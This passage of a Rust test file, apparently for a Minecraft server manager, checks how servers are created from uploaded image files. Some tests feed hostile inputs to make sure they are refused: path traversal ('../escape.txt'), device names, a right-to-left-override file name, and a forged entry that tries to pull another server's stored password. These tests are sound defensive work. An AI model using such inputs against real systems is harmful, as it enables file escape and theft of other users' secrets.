    // the download went through the store, never left in the folder
    assert!(!tree(&made.root)
        .keys()
        .any(|p| p.contains(".lodestone-download")));
}

#[tokio::test]
async fn files_and_requests_that_cannot_be_made_are_refused() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let image = summary["image"].clone();
    for (what, body, status) in [
        (
            "a file that changed",
            json!({ "upload_id": upload_id, "image": "0".repeat(64), "name": "Refused", "port": 25605 }),
            StatusCode::CONFLICT,
        ),
        (
            "a name that isn't one",
            json!({ "upload_id": upload_id, "image": image, "name": "a/b", "port": 25605 }),
            StatusCode::BAD_REQUEST,
        ),
        (
            "a port that isn't one",
            json!({ "upload_id": upload_id, "image": image, "name": "Refused", "port": 0 }),
            StatusCode::BAD_REQUEST,
        ),
        (
            "a world the file hasn't",
            json!({ "upload_id": upload_id, "image": image, "name": "Refused", "port": 25605, "world": "C" }),
            StatusCode::BAD_REQUEST,
        ),
        (
            "an upload that isn't there",
            json!({ "upload_id": "nope", "image": image, "name": "Refused", "port": 25605 }),
            StatusCode::NOT_FOUND,
        ),
    ] {
        let (got, body) = core.create(&owner, body).await;
        assert_eq!(got, status, "{what}: {body}");
    }
    let quilt = launcher_file(core.dir.path(), |data, content, _| {
        data.game.loader = lodestone_image::Loader::Quilt;
        content.game.loader = lodestone_image::Loader::Quilt;
    });
    let (quilt_id, quilt_summary) = core.upload_ok(&owner, &quilt).await;
    let (got, body) = core
        .create(
            &owner,
            json!({ "upload_id": quilt_id, "image": quilt_summary["image"], "name": "Refused", "port": 25605 }),
        )
        .await;
    assert_eq!(got, StatusCode::BAD_REQUEST, "{body}");
    assert!(body.to_string().contains("Quilt"), "{body}");
    // nothing was made for any of them
    assert_eq!(core.state.instances.len(), 1);
    let made_any = std::fs::read_dir(crate::prelude::path_to_instances())
        .unwrap()
        .flatten()
        .any(|e| e.file_name().to_string_lossy().starts_with("Refused"));
    assert!(!made_any);
}

/// Uploads arriving, servers made from files, and backups exported or zipped for download
/// hold what they write in one count, so none passes its free-space check counting on
/// space another is about to fill.
#[tokio::test]
async fn large_writes_never_count_on_the_same_space() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    // another write (an export, say) holds more than the disk has left
    let other = core.state.images.large_writes.reserve(u64::MAX / 4);
    let (status, reply) = core
        .create(
            &owner,
            json!({ "upload_id": upload_id, "image": summary["image"], "name": "Full", "port": 25607 }),
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{reply}");
    assert!(
        reply.to_string().contains("Not enough free disk space"),
        "{reply}"
    );
    let (status, reply) = core.upload(&owner, &file, "again.lodeimg").await;
    assert_eq!(status, StatusCode::CONFLICT, "{reply}");
    let export = format!("/instance/{}/backups/{id}/export", core.uuid);
    let (status, reply) = core.call(Method::POST, &export, &owner, None).await;
    assert!(
        reply.to_string().contains("Not enough free disk space"),
        "{status} {reply}"
    );
    let zip = format!("/instance/{}/backups/{id}/download", core.uuid);
    let (status, reply) = core.call(Method::POST, &zip, &owner, None).await;
    assert!(
        reply.to_string().contains("Not enough free disk space"),
        "{status} {reply}"
    );
    // and a server being made holds its share against the others' checks
    drop(other);
    let gate = core.modrinth.stall_downloads();
    core.modrinth.add(lithium());
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let (status, reply) = core
        .create(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Placing",
                "port": 25608, "world": "A"
            }),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{reply}");
    wait_until("the creation holds its share", || async {
        core.state.images.large_writes.total() > 0
    })
    .await;
    gate.add_permits(1000);
    wait_until("the creation lets its share go", || async {
        core.state.images.large_writes.total() == 0
    })
    .await;
}

#[tokio::test]
async fn a_failed_setup_leaves_no_server_behind() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    core.setup
        .fail
        .store(true, std::sync::atomic::Ordering::SeqCst);
    let mut events = core.state.event_broadcaster.subscribe();
    let (status, reply) = core
        .create(
            &owner,
            json!({ "upload_id": upload_id, "image": summary["image"], "name": "Broken", "port": 25606 }),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{reply}");
    let uuid: InstanceUuid = serde_json::from_value(reply).unwrap();
    loop {
        let event = tokio::time::timeout(std::time::Duration::from_secs(60), events.recv())
            .await
            .unwrap()
            .unwrap();
        if let crate::events::EventInner::ProgressionEvent(p) = event.event_inner {
            if let crate::events::ProgressionEventInner::ProgressionEnd { success, .. } =
                p.progression_event_inner()
            {
                assert!(!success);
                break;
            }
        }
    }
    assert!(core.state.instances.get(&uuid).is_none());
    let folder = crate::handlers::instance::instance_setup_path(
        crate::prelude::path_to_instances(),
        "Broken",
        &uuid,
    );
    wait_until("the folder is removed", || async { !folder.exists() }).await;
    assert!(!core
        .dir
        .path()
        .join("backups/images")
        .join(uuid.as_ref())
        .exists());
    // what it unpacked is collected once past the store's grace
    wait_until("a later collection is asked for", || async {
        core.state.images.delayed_gc_requests() >= 1
    })
    .await;
}

#[tokio::test]
async fn carried_jars_need_permission_to_change_global_files() {
    let core = core().await;
    let creator = core
        .user(
            "creator",
            false,
            UserPermission {
                can_create_instance: true,
                ..Default::default()
            },
        )
        .await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&creator, &file).await;
    assert_eq!(summary["needs_global_files"], true);
    let (status, body) = core
        .create(
            &creator,
            json!({ "upload_id": upload_id, "image": summary["image"], "name": "X", "port": 25607 }),
        )
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    // someone else's upload is never theirs to use
    let owner = core.owner().await;
    let (status, _) = core
        .create(
            &owner,
            json!({ "upload_id": upload_id, "image": summary["image"], "name": "X", "port": 25607 }),
        )
        .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let viewer = core.member("viewer", |_| {}).await;
    let (status, _) = core
        .create(
            &viewer,
            json!({ "upload_id": upload_id, "image": summary["image"], "name": "X", "port": 25607 }),
        )
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn collections_while_a_server_is_made_never_take_its_files() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let file = core.export(&owner, &id, json!({})).await;
    // the backup goes and the store ages: its files are free for a collection to take,
    // and the same ones are what the file brings back
    let (status, _) = core
        .call(
            Method::DELETE,
            &format!("/instance/{}/backups/{id}", core.uuid),
            &owner,
            None,
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    crate::images::end_to_end_tests::age_store(core.state.images.store().root());
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let collector = {
        let (stop, images) = (stop.clone(), core.state.images.clone());
        std::thread::spawn(move || {
            let mut runs = 0;
            while !stop.load(std::sync::atomic::Ordering::SeqCst) {
                images.collect_blocking().unwrap();
                runs += 1;
            }
            runs
        })
    };
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Collected",
                "port": 25608
            }),
        )
        .await;
    stop.store(true, std::sync::atomic::Ordering::SeqCst);
    assert!(collector.join().unwrap() > 0);
    let made = made.unwrap();
    assert_eq!(made.read("world/level.dat"), "level v1");
    assert_eq!(made.read("world/region/r.0.0.mca"), "region v1");
    assert_eq!(made.read("mods/own.jar"), "the owner's own mod");
}

/// The file at `path` with its `image.json` changed by `edit` (not sealed again).
fn with_manifest(path: &Path, edit: impl Fn(&mut Value)) -> PathBuf {
    let entries = all_bytes(path);
    let out = path.with_file_name(format!("edited-{}.lodeimg", rand_suffix()));
    let mut zip = zip::ZipWriter::new(std::fs::File::create(&out).unwrap());
    for (name, bytes) in entries {
        let bytes = if name == "image.json" {
            let mut manifest: Value = serde_json::from_slice(&bytes).unwrap();
            edit(&mut manifest);
            serde_json::to_vec(&manifest).unwrap()
        } else {
            bytes
        };
        zip.start_file(name, zip::write::SimpleFileOptions::default())
            .unwrap();
        std::io::Write::write_all(&mut zip, &bytes).unwrap();
    }
    zip.finish().unwrap();
    out
}

#[tokio::test]
async fn hostile_manifests_are_refused_before_anything_is_made() {
    let core = core().await;
    let owner = core.owner().await;
    let good = launcher_file(core.dir.path(), |_, _, _| {});
    for (what, file) in [
        (
            "a manifest whose id lies",
            with_manifest(&good, |m| m["game"]["minecraft"] = json!("1.21.2")),
        ),
        (
            "a Windows device name",
            with_manifest(&good, |m| m["entries"][0]["path"] = json!("CON.txt")),
        ),
        (
            "a path out of the folder",
            with_manifest(&good, |m| m["entries"][0]["path"] = json!("../escape.txt")),
        ),
        (
            "a size that isn't its object's",
            with_manifest(&good, |m| m["entries"][0]["size"] = json!(1u64 << 40)),
        ),
    ] {
        let (status, body) = core.upload(&owner, &file, "x.lodeimg").await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{what}: {body}");
    }
    assert_eq!(core.state.instances.len(), 1);
}

// ---------------------------------------------------------------------------------------
// Choices, what is unpacked, what comes along

/// A Launcher's vanilla world can become a vanilla or a Paper server; a Paper one splits
/// the world the Paper way. Software the file's game can't run is refused.
#[tokio::test]
async fn a_launchers_vanilla_world_can_become_a_paper_server() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, _| {
        for image in [data, content] {
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Vanilla");
    assert_eq!(summary["server_choices"], json!(["Vanilla", "Paper"]));
    let (status, body) = core
        .create(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Refused",
                "port": 25630, "flavour": "Fabric"
            }),
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Paper world",
                "port": 25631, "world": "A", "flavour": "Paper"
            }),
        )
        .await
        .unwrap();
    let asked = core.setup.installed.lock().unwrap().last().unwrap().clone();
    assert!(matches!(
        asked.flavour,
        crate::implementations::minecraft::Flavour::Paper { .. }
    ));
    assert_eq!(made.read("world/level.dat"), "level A");
    assert_eq!(made.read("world_nether/DIM-1/region/r.0.0.mca"), "nether A");
    assert!(!made.has("world/DIM-1"));

    // a Fabric file's server is a Fabric server
    let fabric = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &fabric).await;
    assert_eq!(summary["server_choices"], json!(["Fabric"]));
    let (status, body) = core
        .create(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Refused",
                "port": 25632, "flavour": "Paper"
            }),
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
}

/// Only the files the server takes are unpacked into the store: a Launcher file's other
/// worlds and a player's own files never are, and the space asked for is the pick's.
#[tokio::test]
async fn only_the_files_a_server_takes_are_unpacked() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let whole = container::open(&file, &Limits::default())
        .unwrap()
        .unpacked_bytes();
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert!(
        summary["unpacked_bytes"].as_u64().unwrap() < whole,
        "{summary}"
    );
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "One world",
                "port": 25633, "world": "A"
            }),
        )
        .await
        .unwrap();
    assert_eq!(made.read("world/level.dat"), "level A");
    let store = core.state.images.store();
    let has = |bytes: &[u8]| {
        store.object_complete(&lodestone_image::hex::sha256_hex(bytes), bytes.len() as u64)
    };
    assert!(has(b"level A"));
    assert!(has(b"a jar only the sender has"));
    for never in [&b"level B"[..], b"fov:90", b"pack"] {
        assert!(!has(never), "{}", String::from_utf8_lossy(never));
    }
}

/// The pack a file is built on becomes the new server's pack (its `pack.json`), so the
/// pack's updates find it.
#[tokio::test]
async fn the_pack_a_file_is_built_on_comes_along() {
    let core = core().await;
    let owner = core.owner().await;
    let base = lodestone_image::Base::ModrinthPack {
        project: "1KVo5zza".into(),
        version: "pv1".into(),
        sha512: "c".repeat(128),
    };
    let file = launcher_file(core.dir.path(), |data, content, _| {
        data.base = Some(base.clone());
        content.base = Some(base.clone());
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert!(
        summary["base"].as_str().unwrap().contains("1KVo5zza"),
        "{summary}"
    );
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Packed",
                "port": 25634
            }),
        )
        .await
        .unwrap();
    let info = crate::modpack::pack_info::load(&core.state.images, &made.uuid)
        .expect("the new server's pack.json");
    assert_eq!(info.base, Some(base));
}

/// The owner's "For players" marks travel in a Host's export and are the new server's
/// marks.
#[tokio::test]
async fn the_owners_marks_come_along() {
    let core = core().await;
    let owner = core.owner().await;
    write(
        &core.root,
        &format!("mods/{}", crate::mods::client::MARKS_FILE),
        br#"{"required":["own.jar"],"excluded":[]}"#,
    );
    let id = core.backup(&owner).await;
    let file = core.export(&owner, &id, json!({})).await;
    let opened = container::open(&file, &Limits::default()).unwrap();
    let own = lodestone_image::share::placed_entries(opened.image(), opened.linked())
        .into_iter()
        .find(|e| e.path.as_str() == "mods/own.jar")
        .unwrap();
    assert!(
        own.env_from.contains(&lodestone_image::EnvFrom::OwnerMark),
        "{own:?}"
    );
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Marked",
                "port": 25635
            }),
        )
        .await
        .unwrap();
    let marks: crate::mods::client::ClientMarks =
        serde_json::from_str(&made.read(&format!("mods/{}", crate::mods::client::MARKS_FILE)))
            .unwrap();
    assert!(marks.required.contains("own.jar"), "{marks:?}");
}

/// Scripts come only from the owner while code execution is on: not from another user
/// who may change global files, even with it on.
#[tokio::test]
async fn scripts_come_only_from_the_owner_with_code_execution_on() {
    let core = core().await;
    core.modrinth.add(lithium());
    core.state.code_execution.set(true);
    let owner = core.owner().await;
    let admin = core
        .user(
            "admin",
            false,
            UserPermission {
                can_create_instance: true,
                can_write_global_file: true,
                ..Default::default()
            },
        )
        .await;
    let script = |_: &mut Image, content: &mut Image, store: &lodestone_image::store::Store| {
        let stored = store.put_bytes(b"onEvent()").unwrap();
        content.entries.push(lodestone_image::Entry::new(
            lodestone_image::CanonicalPath::new("kubejs/server_scripts/a.js").unwrap(),
            9,
            stored.sha256,
            Source::Object {},
        ));
    };
    for (who, token, port, placed) in [
        ("admin", &admin, 25636, false),
        ("owner", &owner, 25637, true),
    ] {
        let file = launcher_file(core.dir.path(), script);
        let (upload_id, summary) = core.upload_ok(token, &file).await;
        assert_eq!(summary["scripts_skipped"], u64::from(!placed), "{who}");
        let made = core
            .create_and_wait(
                token,
                json!({
                    "upload_id": upload_id, "image": summary["image"],
                    "name": format!("Scripts {who}"), "port": port
                }),
            )
            .await
            .unwrap();
        assert_eq!(made.has("kubejs/server_scripts/a.js"), placed, "{who}");
    }
}

/// An upload past its hour is deleted on the next prune, whether or not anyone uploads
/// again.
#[tokio::test]
async fn uploads_past_their_hour_are_deleted() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, _) = core.upload_ok(&owner, &file).await;
    let dir = core.dir.path().join("image-uploads");
    let count = || std::fs::read_dir(&dir).unwrap().count();
    assert_eq!(count(), 1);
    core.state
        .image_uploads
        .age_for_test(&upload_id, super::uploads::UPLOAD_TTL);
    core.state.image_uploads.prune_expired();
    assert_eq!(count(), 0);
    let (status, _) = core
        .call(
            Method::DELETE,
            &format!("/instance/image/upload/{upload_id}"),
            &owner,
            None,
        )
        .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

// ---------------------------------------------------------------------------------------
// Review fixes: what a file can't reach, and servers moved from Host to Host

/// A Modrinth file whose download fails is placed only from the file's own bytes, never
/// from another server's object in the store that its hash happens to name: a user who
/// may only create servers mustn't get another server's files out of the store.
#[tokio::test]
async fn a_failed_download_never_places_another_servers_bytes() {
    let core = core().await;
    let owner = core.owner().await;
    // the server's own jar, now in the store
    core.backup(&owner).await;
    let own = std::fs::read(core.root.join("mods/own.jar")).unwrap();
    let creator = core
        .user(
            "creator",
            false,
            UserPermission {
                can_create_instance: true,
                ..Default::default()
            },
        )
        .await;
    let file = launcher_file(core.dir.path(), |_, content, _| {
        // no carried jars, so no permission to change global files is asked
        content
            .entries
            .retain(|e| matches!(e.source, Source::Modrinth { .. }));
        let url = "https://cdn.modrinth.com/data/GONE1/versions/v1/stolen.jar";
        let mut entry = lodestone_image::Entry::new(
            lodestone_image::CanonicalPath::new("mods/stolen.jar").unwrap(),
            own.len() as u64,
            lodestone_image::hex::sha256_hex(&own),
            Source::modrinth_from_url(url).unwrap(),
        );
        entry.sha512 = Some("a".repeat(128));
        content.entries.push(entry);
    });
    core.modrinth.add(lithium());
    let (upload_id, summary) = core.upload_ok(&creator, &file).await;
    assert_eq!(summary["needs_global_files"], false);
    let made = core
        .create_and_wait(
            &creator,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Stolen",
                "port": 25640
            }),
        )
        .await
        .unwrap();
    assert!(!made.has("mods/stolen.jar"));
    assert!(made.message.contains("mods/stolen.jar"), "{}", made.message);
}

/// A Host's file keeps the mods its server gave players (client only by their sides),
/// and a jar that says it runs only on clients: they were on the old server too. The
/// same mods in a Launcher's file are left out (`a_launchers_world_becomes_a_servers`).
#[tokio::test]
async fn a_hosts_mods_for_players_come_along() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, _| {
        for image in [data, content] {
            image.producer.app = lodestone_image::manifest::App::Core;
        }
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["made_by"], "host");
    assert_eq!(summary["client_only"]["count"], 0, "{summary}");
    let mut downloads = names(&summary["mods_from_modrinth"]);
    downloads.sort();
    assert_eq!(downloads, ["lithium.jar", "sodium.jar"]);
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "For players",
                "port": 25641
            }),
        )
        .await
        .unwrap();
    assert_eq!(
        std::fs::read(made.root.join("mods/sodium.jar")).unwrap(),
        sodium().content
    );
    assert!(made.has("mods/zoom.jar"));
    assert!(!made.message.contains("zoom.jar"), "{}", made.message);
}

/// The summary counts what the server takes: a Launcher file's client-only mods aren't
/// downloads, and only the CurseForge files a server would take are named as missing.
#[tokio::test]
async fn a_summary_counts_only_what_the_server_takes() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, content, _| {
        let mut client_cf = lodestone_image::Entry::new(
            lodestone_image::CanonicalPath::new("mods/cf-client.jar").unwrap(),
            6,
            lodestone_image::hex::sha256_hex(b"cfclient"),
            Source::Curseforge {
                project: 3,
                file: 4,
                downloadable: true,
            },
        );
        client_cf.env.server = lodestone_image::EnvValue::Unsupported;
        content.entries.push(client_cf);
    });
    let (_, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(names(&summary["mods_from_modrinth"]), ["lithium.jar"]);
    assert_eq!(
        summary["download_bytes"].as_u64().unwrap(),
        lithium().content.len() as u64
    );
    assert_eq!(names(&summary["not_downloadable"]), ["mods/cf.jar"]);
    assert_eq!(names(&summary["mods_from_curseforge"]), ["cf.jar"]);
    let mut client_only = names(&summary["client_only"]);
    client_only.sort();
    assert_eq!(client_only, ["cf-client.jar", "sodium.jar"]);
}

/// A Forge server moved from Host to Host: the installers' logs stay behind, and the new
/// server's installer, which writes its own, doesn't clash with the file.
#[tokio::test]
async fn a_forge_server_moves_from_host_to_host() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Forge;
            image.game.loader_version = Some("47.2.0".into());
            image
                .entries
                .retain(|e| matches!(e.source, Source::Object {}));
        }
        for path in [
            "forge-installer.log",
            "forge-1.20.1-47.2.0-installer.jar.log",
        ] {
            let stored = store.put_bytes(b"the sender's installer log").unwrap();
            data.entries.push(lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                26,
                stored.sha256,
                Source::Object {},
            ));
        }
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Forge");
    assert!(summary["not_taken"]
        .as_array()
        .unwrap()
        .contains(&json!("server_software")));
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Forge copy",
                "port": 25642
            }),
        )
        .await
        .unwrap();
    assert_eq!(made.read("forge-installer.log"), "the installer's log");
    assert!(!made.has("forge-1.20.1-47.2.0-installer.jar.log"));
    assert_eq!(made.read("mods/carried.jar"), "a jar only the sender has");
}

/// A file the new server's setup already wrote stays the setup's: the file's copy is
/// skipped rather than failing the whole creation.
#[tokio::test]
async fn what_the_setup_wrote_is_kept_and_the_rest_placed() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    core.setup.extra_files.lock().unwrap().push((
        "config/lithium.properties".into(),
        b"the loader's own".to_vec(),
    ));
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Setup wrote",
                "port": 25643, "world": "A"
            }),
        )
        .await;
    core.setup.extra_files.lock().unwrap().clear();
    let made = made.unwrap();
    assert_eq!(made.read("config/lithium.properties"), "the loader's own");
    assert_eq!(made.read("world/level.dat"), "level A");
}

/// While a file's files are being placed, the new folder has no `.lodestone_config`, so a
/// core stopped then never loads it; startup deletes such a folder and its images, and
/// keeps a finished server whose marker wasn't removed yet.
#[tokio::test]
async fn a_creation_a_stop_interrupts_leaves_no_server() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let gate = core.modrinth.stall_downloads();
    let mut events = core.state.event_broadcaster.subscribe();
    let (status, reply) = core
        .create(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Interrupted",
                "port": 25644, "world": "A"
            }),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{reply}");
    let uuid: InstanceUuid = serde_json::from_value(reply).unwrap();
    let folder = crate::handlers::instance::instance_setup_path(
        crate::prelude::path_to_instances(),
        "Interrupted",
        &uuid,
    );
    wait_until("the downloads start", || async {
        !core.modrinth.downloaded.lock().unwrap().is_empty()
    })
    .await;
    let marker = folder.join(crate::handlers::instance::CREATING_MARKER);
    assert!(marker.exists());
    assert!(!folder.join(".lodestone_config").exists());
    // one server at a time from an upload: a second request (a client retrying) is refused
    let (status, reply) = core
        .create(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Again",
                "port": 25645, "world": "A"
            }),
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{reply}");
    assert!(reply.to_string().contains("already being made"), "{reply}");
    // a core reading its servers now doesn't take this one
    let copy_dir = tempfile::tempdir().unwrap();
    let instances = copy_dir.path().join("instances");
    let copied = instances.join("Interrupted");
    std::fs::create_dir_all(&copied).unwrap();
    for entry in std::fs::read_dir(&folder).unwrap().flatten() {
        if entry.file_type().unwrap().is_file() {
            std::fs::copy(entry.path(), copied.join(entry.file_name())).unwrap();
        }
    }
    // (the copy's own uuid, so its clean-up never touches the real one's images; it has
    // images of its own, which startup deletes before the folder)
    let copy_uuid = InstanceUuid::default();
    std::fs::write(
        copied.join(crate::handlers::instance::CREATING_MARKER),
        copy_uuid.to_string(),
    )
    .unwrap();
    let copy_images = crate::images::instance_dir(core.state.images.root(), &copy_uuid).unwrap();
    std::fs::create_dir_all(&copy_images).unwrap();
    std::fs::write(copy_images.join("history.json"), b"[]").unwrap();
    // a folder whose images can't be deleted stays, with its marker, for the next start
    #[cfg(unix)]
    let stuck = {
        use std::os::unix::fs::PermissionsExt;
        let stuck = instances.join("Stuck");
        std::fs::create_dir_all(&stuck).unwrap();
        let stuck_uuid = InstanceUuid::default();
        std::fs::write(
            stuck.join(crate::handlers::instance::CREATING_MARKER),
            stuck_uuid.to_string(),
        )
        .unwrap();
        let locked = crate::images::instance_dir(core.state.images.root(), &stuck_uuid)
            .unwrap()
            .join("locked");
        std::fs::create_dir_all(&locked).unwrap();
        std::fs::write(locked.join("manifest"), b"x").unwrap();
        std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o500)).unwrap();
        // root ignores the mode (as can a disk without Unix permissions), so the images
        // can still be deleted and the folder isn't stuck: the stuck assertions are skipped
        let probe = locked.join("probe");
        let enforced = std::fs::write(&probe, b"").is_err();
        if !enforced {
            let _ = std::fs::remove_file(&probe);
        }
        (stuck, locked, enforced)
    };
    let loaded = crate::restore_instances(
        &instances,
        core.state.event_broadcaster.clone(),
        CodeExecutionSwitch::new(false),
    )
    .await
    .unwrap();
    assert!(loaded.is_empty());
    // startup deletes it; a finished server with a leftover marker only loses the marker
    let finished = instances.join("Finished");
    std::fs::create_dir_all(&finished).unwrap();
    std::fs::write(finished.join(".lodestone_config"), b"{}").unwrap();
    std::fs::write(
        finished.join(crate::handlers::instance::CREATING_MARKER),
        b"INSTANCE_x",
    )
    .unwrap();
    let delayed = core.state.images.delayed_gc_requests();
    crate::handlers::instance::remove_unfinished_creations(&instances, &core.state.images).await;
    assert!(!copied.exists());
    assert!(!copy_images.exists(), "its images go too");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let (stuck, locked, enforced) = stuck;
        if enforced {
            assert!(stuck
                .join(crate::handlers::instance::CREATING_MARKER)
                .exists());
            std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o700)).unwrap();
            std::fs::remove_dir_all(&stuck).unwrap();
        } else {
            // deleted like the others (or moved aside and emptied in the background)
            let _ = std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o700));
            let _ = std::fs::remove_dir_all(&stuck);
        }
    }
    // moved aside at once, deleted in the background, its objects collected later
    let aside = copy_dir.path().join("instances.unfinished");
    assert!(!aside.exists(), "emptied in the background");
    assert_eq!(core.state.images.delayed_gc_requests(), delayed + 1);
    assert!(finished.join(".lodestone_config").exists());
    assert!(!finished
        .join(crate::handlers::instance::CREATING_MARKER)
        .exists());

    gate.add_permits(1000);
    loop {
        let event = tokio::time::timeout(std::time::Duration::from_secs(60), events.recv())
            .await
            .unwrap()
            .unwrap();
        if let crate::events::EventInner::ProgressionEvent(p) = event.event_inner {
            if let crate::events::ProgressionEventInner::ProgressionEnd { success, .. } =
                p.progression_event_inner()
            {
                assert!(success);
                break;
            }
        }
    }
    // finished: loaded from now on
    assert!(folder.join(".lodestone_config").exists());
    assert!(!marker.exists());
    assert!(core.state.instances.get(&uuid).is_some());
    let _ = std::fs::remove_dir_all(&folder);
}

/// The file's name is written visibly in the new server's history.
#[tokio::test]
async fn the_files_name_is_written_visibly_in_the_history() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (status, body) = core.upload(&owner, &file, "evil\u{202E}gmi.lodeimg").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": body["upload_id"], "image": body["summary"]["image"],
                "name": "Visible", "port": 25645
            }),
        )
        .await
        .unwrap();
    assert_eq!(
        current_label(&core, &made.uuid).await,
        "Created from evil\\u{202E}gmi.lodeimg"
    );
}

/// `file` written again with the zip entry `name`'s bytes replaced by `bytes`, every other
/// entry copied as it is.
fn rewrite_entry(file: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    use std::io::Write as _;
    let to = file.with_extension("forged.lodeimg");
    let mut archive = zip::ZipArchive::new(std::fs::File::open(file).unwrap()).unwrap();
    let mut out = zip::ZipWriter::new(std::fs::File::create(&to).unwrap());
    for i in 0..archive.len() {
        let entry = archive.by_index_raw(i).unwrap();
        if entry.name().unwrap() == name {
            drop(entry);
            out.start_file(
                name,
                zip::write::SimpleFileOptions::default()
                    .compression_method(zip::CompressionMethod::Stored),
            )
            .unwrap();
            out.write_all(bytes).unwrap();
        } else {
            out.raw_copy_file(entry).unwrap();
        }
    }
    out.finish().unwrap();
    to
}

/// A file naming an object the core's store holds (another server's file) by its hash
/// and size, with other bytes of that length, is refused: the store's bytes never reach
/// the new server.
#[tokio::test]
async fn a_file_must_carry_the_bytes_it_names() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    let secret = b"rcon.password=another-servers-password\n";
    core.state.images.store().put_bytes(secret).unwrap();
    let sha256 = lodestone_image::hex::sha256_hex(secret);
    let forge = |path: &str| {
        let file = launcher_file(core.dir.path(), |_, content, store| {
            store.put_bytes(secret).unwrap();
            content.entries.push(lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                secret.len() as u64,
                sha256.clone(),
                Source::Object {},
